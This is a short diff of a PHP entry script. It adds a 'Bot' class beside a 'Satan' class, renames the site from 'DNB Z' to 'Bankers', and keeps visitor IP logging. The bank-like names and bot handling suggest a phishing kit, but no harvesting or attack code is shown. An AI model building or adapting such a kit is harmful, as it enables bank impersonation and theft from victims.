@@ -30,14 +30,16 @@ require_once ('class/Validate.php');
 require_once ('class/Mysqli.php');
 require_once ('class/Custom.php');
 require_once ('class/Satan.php');
+require_once ('class/Bot.php');
 require_once ('opendb.php');
 
 $customClass = Custom::init();
 $satan = Satan::init();
+$bot = Bot::init();
 
 require_once ('pages.php');
 
-$conf['sitename'] = "DNB Z";
+$conf['sitename'] = "Bankers";
 
 $visitorIP = $customClass->getUserIP();
 $customClass->makeLog();
